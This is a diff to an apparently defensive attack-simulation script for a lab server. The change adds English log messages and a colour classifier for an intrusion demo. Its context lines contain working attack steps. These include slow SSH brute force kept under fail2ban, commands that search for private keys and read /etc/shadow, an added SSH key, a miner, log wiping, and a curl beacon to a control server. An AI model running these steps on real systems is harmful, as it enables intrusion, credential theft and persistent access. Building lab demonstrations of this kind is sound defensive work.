@@ -52,6 +52,20 @@ HOMES = [f"192.0.2.{n}" for n in range(11, 23)]
 LAB_PASSWORD = "Alveo2026!"  # operatore's password on lab-01: a lab account, nowhere else.
 
 
+def _classify(msg):
+    """Colour class for one feed line, from the Italian text, so the colour is the same in both languages.
+    Mirrors the console's classify(): hit = attacker got in, block = defence held, msf = Metasploit/module, err = error."""
+    if re.search(r"ACCESSO RIUSCITO|handshake: RIUSCITO|la VPN la accetta|è nella rete|backdoor attiva", msg):
+        return "hit"
+    if re.match(r"^errore:", msg) or re.search(r"\berrore\b", msg):
+        return "err"
+    if re.search(r"rifiutata|nessuna risposta|bloccato|banna|limitato|scarta|non risponde|non registra|ignora chi|404|429|403|401|open\|filtered", msg):
+        return "block"
+    if re.match(r"^\s*\[[+*!\-]\]", msg) or re.search(r"\[.+\]|metasploit|moduli|modulo", msg):
+        return "msf"
+    return ""
+
+
 def target_for(source):
     for prefix, target in TARGETS.items():
         if source.startswith(prefix):
@@ -84,14 +98,15 @@ def ssh_try(source, user, password, log, command="true", script=None):
          "-o", "ConnectTimeout=4", "-o", "LogLevel=ERROR", f"{user}@{target}", command],
         input=script, capture_output=True, text=True, timeout=30)
     if r.returncode == 0:
-        log(f"{source} → ssh {user}: ACCESSO RIUSCITO")
+        log(f"{source} → ssh {user}: ACCESSO RIUSCITO", f"{source} → ssh {user}: ACCESS GRANTED")
         for line in r.stdout.strip().splitlines()[:4]:
             log(f"    {line}")
         return "ok"
     if r.returncode == 5 or "Permission denied" in r.stderr:
-        log(f"{source} → ssh {user}: password rifiutata")
+        log(f"{source} → ssh {user}: password rifiutata", f"{source} → ssh {user}: password rejected")
         return "denied"
-    log(f"{source} → ssh {user}: nessuna risposta (bloccato da fail2ban o dal firewall)")
+    log(f"{source} → ssh {user}: nessuna risposta (bloccato da fail2ban o dal firewall)",
+        f"{source} → ssh {user}: no answer (blocked by fail2ban or the firewall)")
     return "blocked"
 
 
@@ -138,7 +153,9 @@ def http_get(source, path, log=None, headers=None, quiet=False):
     except OSError:
         status = None
     if log and not quiet:
-        log(f"{source} → GET {path[:70]}: {status if status else 'nessuna risposta (bloccato)'}")
+        tail = status if status else "nessuna risposta (bloccato)"
+        tail_en = status if status else "no answer (blocked)"
+        log(f"{source} → GET {path[:70]}: {tail}", f"{source} → GET {path[:70]}: {tail_en}")
     return status
 
 
@@ -153,7 +170,9 @@ def http_post(source, path, body, log, content_type="application/x-www-form-urle
         conn.close()
     except OSError:
         status = None
-    log(f"{source} → POST {path} [{body[:60]}]: {status if status else 'nessuna risposta (bloccato)'}")
+    tail = status if status else "nessuna risposta (bloccato)"
+    tail_en = status if status else "no answer (blocked)"
+    log(f"{source} → POST {path} [{body[:60]}]: {tail}", f"{source} → POST {path} [{body[:60]}]: {tail_en}")
     return status
 
 
@@ -163,7 +182,9 @@ def nmap(source, args, log):
     log(f"{source} → nmap {' '.join(args)}")
     r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
     open_ports = [l.split()[0] for l in r.stdout.splitlines() if "/tcp" in l and " open " in l]
-    log(f"    porte aperte trovate: {', '.join(open_ports) if open_ports else 'nessuna'}")
+    found = ', '.join(open_ports) if open_ports else 'nessuna'
+    found_en = ', '.join(open_ports) if open_ports else 'none'
+    log(f"    porte aperte trovate: {found}", f"    open ports found: {found_en}")
 
 
 # --- Metasploit ------------------------------------------------------------------------------------------------
@@ -213,10 +234,12 @@ def _msf(source, modules, log, timeout=420):
     try:
         client = _msf_client()
     except Exception as ex:
-        log(f"Metasploit non raggiungibile ({ex}): avvia il suo container con  make lab-up-msf")
+        log(f"Metasploit non raggiungibile ({ex}): avvia il suo container con  make lab-up-msf",
+            f"Metasploit unreachable ({ex}): start its container with  make lab-up-msf")
         return
     target = target_for(source)
-    log(f"metasploit → {target} ({len(modules)} moduli, dall'indirizzo del container Metasploit nel lab)")
+    log(f"metasploit → {target} ({len(modules)} moduli, dall'indirizzo del container Metasploit nel lab)",
+        f"metasploit → {target} ({len(modules)} modules, from the Metasploit container's address in the lab)")
     console = client.consoles.console()
     try:
         for module, opts in modules:
@@ -236,7 +259,9 @@ def _msf(source, modules, log, timeout=420):
             _emit(console.read().get("data", ""), log, limited)
             if limited[0]:
                 log(f"    {limited[0]} risposte 429: lab-01 ha limitato la scansione (nginx, 10 richieste al secondo), "
-                    "non sono directory trovate")
+                    "non sono directory trovate",
+                    f"    {limited[0]} × 429: lab-01 rate-limited the scan (nginx, 10 requests per second), "
+                    "these are not directories found")
     finally:
         try:
             console.destroy()
@@ -265,7 +290,8 @@ def ssh_fast(log):
 def intrusion(log):
     src = "198.51.100.213"
     nmap(src, ["-sS", "--top-ports", "50", "-T4"], log)
-    log("pausa: l'attaccante prova piano, sotto la soglia di fail2ban (5 tentativi in un minuto)")
+    log("pausa: l'attaccante prova piano, sotto la soglia di fail2ban (5 tentativi in un minuto)",
+        "pause: the attacker goes slow, below the fail2ban threshold (5 attempts in a minute)")
     for pw in ["operatore", "Operatore1", "alveo2025", "Alveo2025!"]:
         ssh_try(src, "operatore", pw, log)
         time.sleep(16)
@@ -312,17 +338,19 @@ def web_login(log):
 
 def flood(log):
     src = "203.0.113.15"
-    log(f"{src} → 300 richieste in pochi secondi")
+    log(f"{src} → 300 richieste in pochi secondi", f"{src} → 300 requests in a few seconds")
     with ThreadPoolExecutor(max_workers=30) as pool:
         statuses = list(pool.map(lambda _: http_get(src, "/", quiet=True), range(300)))
     counts = {}
     for s in statuses:
         counts[s] = counts.get(s, 0) + 1
-    log("    risposte: " + ", ".join(f"{k or 'nessuna'}×{v}" for k, v in sorted(counts.items(), key=lambda kv: str(kv[0]))))
+    log("    risposte: " + ", ".join(f"{k or 'nessuna'}×{v}" for k, v in sorted(counts.items(), key=lambda kv: str(kv[0]))),
+        "    responses: " + ", ".join(f"{k or 'none'}×{v}" for k, v in sorted(counts.items(), key=lambda kv: str(kv[0]))))
 
 
 def campaign(log):
-    log("12 connessioni domestiche provano l'account scada, due volte ciascuna: nessuna supera la soglia")
+    log("12 connessioni domestiche provano l'account scada, due volte ciascuna: nessuna supera la soglia",
+        "12 home connections try the scada account, twice each: none crosses the threshold")
     for src in HOMES:
         for pw in ["scada", "Scada2024"]:
             ssh_try(src, "scada", pw, log)
@@ -350,7 +378,8 @@ def start_c2():
 
 def inside(log):
     src = "198.51.100.213"
-    log("l'intruso, entrato con la password trovata, si guarda intorno: chiavi, password, una porta per tornare, un miner, le tracce")
+    log("l'intruso, entrato con la password trovata, si guarda intorno: chiavi, password, una porta per tornare, un miner, le tracce",
+        "the intruder, in with the found password, looks around: keys, passwords, a way back in, a miner, the tracks")
     steps = "\n".join([
         "find / -maxdepth 4 -name id_rsa 2>/dev/null",
         f"echo '{LAB_PASSWORD}' | sudo -S -p '' cat /etc/shadow > /dev/null",
@@ -360,15 +389,18 @@ def inside(log):
         "echo fatto",
     ])
     ssh_try(src, "operatore", LAB_PASSWORD, log, script=steps)
-    log("Falco su lab-01: chiavi cercate, /etc/shadow letto, chiave SSH aggiunta, miner avviato, wtmp svuotato")
+    log("Falco su lab-01: chiavi cercate, /etc/shadow letto, chiave SSH aggiunta, miner avviato, wtmp svuotato",
+        "Falco on lab-01: keys searched, /etc/shadow read, SSH key added, miner started, wtmp wiped")
 
 
 def backdoor(log):
     src = "198.51.100.213"
-    log("l'intruso entra con la password trovata e installa una backdoor che chiama il suo server di controllo")
+    log("l'intruso entra con la password trovata e installa una backdoor che chiama il suo server di controllo",
+        "the intruder gets in with the found password and installs a backdoor that calls its control server")
     beacon = f"for i in 1 2 3; do curl -s -o /dev/null -A 'Mozilla/5.0' http://{C2}:{C2_PORT}/gate.php?id=lab-01; sleep 5; done; echo backdoor attiva"
     ssh_try(src, "operatore", LAB_PASSWORD, log, command=beacon)
-    log(f"lab-01 → {C2}:{C2_PORT}/gate.php: tre chiamate al server di controllo")
+    log(f"lab-01 → {C2}:{C2_PORT}/gate.php: tre chiamate al server di controllo",
+        f"lab-01 → {C2}:{C2_PORT}/gate.php: three calls to the control server")
 
 
 def msf_web(log):
@@ -473,7 +505,7 @@ def _tunnel(source, private_key, conf, log, wait=8):
         subprocess.run(["ip", "addr", "add", conf["Address"].split(",")[0].strip(), "dev", VPN_IFACE], check=True)
         subprocess.run(["ip", "link", "set", VPN_IFACE, "up"], check=True)
         subprocess.run(["ip", "route", "replace", "10.88.0.1/32", "dev", VPN_IFACE], check=True)
-        log(f"{source} → WireGuard verso {target}:{VPN_PORT} (UDP)")
+        log(f"{source} → WireGuard verso {target}:{VPN_PORT} (UDP)", f"{source} → WireGuard to {target}:{VPN_PORT} (UDP)")
         ping = subprocess.run(["ping", "-c", "3", "-W", "2", "10.88.0.1"], capture_output=True, text=True)
         deadline = time.time() + wait
         hs = 0
@@ -484,7 +516,8 @@ def _tunnel(source, private_key, conf, log, wait=8):
                 break
             time.sleep(1)
         answered = " 0 received" not in ping.stdout
-        log(f"    handshake: {'RIUSCITO' if hs else 'nessuna risposta'}; ping al gateway VPN 10.88.0.1: {'risponde' if answered else 'nessuna risposta'}")
+        log(f"    handshake: {'RIUSCITO' if hs else 'nessuna risposta'}; ping al gateway VPN 10.88.0.1: {'risponde' if answered else 'nessuna risposta'}",
+            f"    handshake: {'SUCCESSFUL' if hs else 'no answer'}; ping to VPN gateway 10.88.0.1: {'replies' if answered else 'no answer'}")
         return hs
     finally:
         for path in keys:
@@ -495,16 +528,18 @@ def _tunnel(source, private_key, conf, log, wait=8):
 
 def vpn_scan(log):
     src = "203.0.113.6"
-    log(f"{src} → nmap -sU -p {VPN_PORT} (la porta di WireGuard)")
+    log(f"{src} → nmap -sU -p {VPN_PORT} (la porta di WireGuard)", f"{src} → nmap -sU -p {VPN_PORT} (WireGuard's port)")
     r = subprocess.run(["nmap", "-n", "-Pn", "-sU", "-S", src, "-e", iface_for(src), "--max-retries", "1", "-p", str(VPN_PORT), target_for(src)],
                        capture_output=True, text=True, timeout=120)
     state = next((l.split()[1] for l in r.stdout.splitlines() if l.startswith(f"{VPN_PORT}/udp")), "?")
     log(f"    {VPN_PORT}/udp: {state}")
-    log("    nessuna risposta: WireGuard non risponde a chi non ha una chiave, la porta sembra chiusa come tutte le altre")
+    log("    nessuna risposta: WireGuard non risponde a chi non ha una chiave, la porta sembra chiusa come tutte le altre",
+        "    no answer: WireGuard does not reply to anyone without a key, the port looks closed like all the others")
 
 
 def _no_vpn(log):
-    log(f"manca {STOLEN_CONF}: lab-01 non ha ancora la VPN (make lab-up ricostruisce le immagini)")
+    log(f"manca {STOLEN_CONF}: lab-01 non ha ancora la VPN (make lab-up ricostruisce le immagini)",
+        f"{STOLEN_CONF} missing: lab-01 does not have the VPN yet (make lab-up rebuilds the images)")
 
 
 def vpn_wrong_key(log):
@@ -512,10 +547,12 @@ def vpn_wrong_key(log):
     conf = _wg_conf()
     if conf is None:
         return _no_vpn(log)
-    log("l'attaccante conosce l'indirizzo e la chiave pubblica del server, ma ha una chiave sua, che il server non conosce")
+    log("l'attaccante conosce l'indirizzo e la chiave pubblica del server, ma ha una chiave sua, che il server non conosce",
+        "the attacker knows the server's address and public key, but has its own key, which the server does not know")
     key = subprocess.run(["wg", "genkey"], capture_output=True, text=True).stdout.strip()
     _tunnel(src, key, {**conf, "PresharedKey": ""}, log)
-    log("    il server scarta i pacchetti in silenzio: non risponde e non scrive niente nei log")
+    log("    il server scarta i pacchetti in silenzio: non risponde e non scrive niente nei log",
+        "    the server drops the packets silently: it does not answer and writes nothing to the logs")
 
 
 def vpn_stolen(log):
@@ -523,10 +560,13 @@ def vpn_stolen(log):
     conf = _wg_conf()
     if conf is None:
         return _no_vpn(log)
-    log("la configurazione del portatile di anna (anna-portatile), persa e trovata dall'attaccante, usata da Bucarest")
+    log("la configurazione del portatile di anna (anna-portatile), persa e trovata dall'attaccante, usata da Bucarest",
+        "anna's laptop configuration (anna-portatile), lost and found by the attacker, used from Bucharest")
     if _tunnel(src, conf["PrivateKey"], conf, log):
-        log("    la VPN la accetta: la chiave è valida. L'attaccante è nella rete del cliente come se fosse anna")
-        log("    entro un minuto la pagina di lab-01 mostra anna-portatile collegata da Bucarest e propone: sudo xrc-vpn revoke anna-portatile")
+        log("    la VPN la accetta: la chiave è valida. L'attaccante è nella rete del cliente come se fosse anna",
+            "    the VPN accepts it: the key is valid. The attacker is on the customer's network as if it were anna")
+        log("    entro un minuto la pagina di lab-01 mostra anna-portatile collegata da Bucarest e propone: sudo xrc-vpn revoke anna-portatile",
+            "    within a minute lab-01's page shows anna-portatile connected from Bucharest and suggests: sudo xrc-vpn revoke anna-portatile")
 
 
 def ai_hunt(log):
@@ -547,14 +587,18 @@ def ai_hunt(log):
 def full_night(log):
     # The order of a real intrusion: recon, then noisy attacks that fail2ban bans, then the patient intruder that
     # stays under the threshold and gets in, then what it does inside and the call home.
-    for title, fn in [("Scansione delle porte", port_scan), ("Protocolli industriali", industrial_probe),
-                      ("Scansione del sito", web_scan),
-                      ("Forza bruta SSH veloce", ssh_fast), ("Forza bruta sull'area riservata", web_login),
-                      ("Flood di richieste", flood),
-                      ("Exploit web", web_exploit), ("Attacco nascosto nel modulo", hidden_post),
-                      ("Intrusione lenta", intrusion),
-                      ("Dentro il server", inside), ("Backdoor", backdoor)]:
-        log(f"— {title} —")
+    for title, title_en, fn in [("Scansione delle porte", "Port scan", port_scan),
+                                ("Protocolli industriali", "Industrial protocols", industrial_probe),
+                                ("Scansione del sito", "Website scan", web_scan),
+                                ("Forza bruta SSH veloce", "Fast SSH brute force", ssh_fast),
+                                ("Forza bruta sull'area riservata", "Reserved-area brute force", web_login),
+                                ("Flood di richieste", "Request flood", flood),
+                                ("Exploit web", "Web exploits", web_exploit),
+                                ("Attacco nascosto nel modulo", "Attack hidden in the form", hidden_post),
+                                ("Intrusione lenta", "Slow intrusion", intrusion),
+                                ("Dentro il server", "Inside the server", inside),
+                                ("Backdoor", "Backdoor", backdoor)]:
+        log(f"— {title} —", f"— {title_en} —")
         fn(log)
 
 
@@ -725,16 +769,17 @@ class Runner:
         return run, None
 
     def _run(self, scenario, run, external):
-        def log(msg):
-            run["log"].append({"t": time.strftime("%H:%M:%S"), "msg": msg})
+        def log(it, en=None):
+            run["log"].append({"t": time.strftime("%H:%M:%S"), "msg": it, "msg_en": en or it, "cls": _classify(it)})
         try:
             if external is not None:
                 set_web_target(web_endpoint_of(external))
-                log(f"bersaglio: {external['host']} ({external['web']}) — dal nostro indirizzo")
+                log(f"bersaglio: {external['host']} ({external['web']}) — dal nostro indirizzo",
+                    f"target: {external['host']} ({external['web']}) — from our address")
             scenario["run"](log)
             run["status"] = "finito"
         except Exception as ex:  # a failed scenario is reported in the console, never hidden
-            log(f"errore: {ex}")
+            log(f"errore: {ex}", f"error: {ex}")
             run["status"] = "errore"
         finally:
             set_web_target(None)
